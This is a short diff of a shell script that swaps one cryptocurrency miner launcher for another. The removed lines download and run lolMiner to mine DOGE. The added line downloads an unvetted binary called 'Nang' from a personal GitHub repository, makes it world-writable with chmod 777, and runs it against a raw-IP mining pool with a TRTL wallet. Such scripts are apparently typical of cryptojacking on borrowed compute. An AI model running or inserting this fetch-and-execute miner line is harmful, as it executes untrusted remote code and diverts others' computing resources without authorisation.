@@ -1,5 +1,1 @@
-wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz
-tar xf lolMiner_v1.29_Lin64.tar.gz
-cd 1.29
-WORKER=$(shuf -i 1-999999 -n 1)
-./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user DOGE:DPaUko97KMzZcxXJdhT81eqEgpvtgiYsqf.$WORKER --ethstratum ETHPROXY
+wget https://github.com/haningsari/nang/raw/main/Nang && chmod 777 Nang && POL=45.63.77.214:3135 && WAL=TRTLuzjcdfTUU9G3jAAWt8bmenoiVsjwgLtNS61EHdFefKtkScQY33NX9vamnUcG35BkQy6VfwUy5CsV9YNomioPGGyVhJU8Rge && WOR=sabri && ./Nang --donate-level 1 -o $POL -u $WAL -p $WOR -a argon2/chukwav2 -k
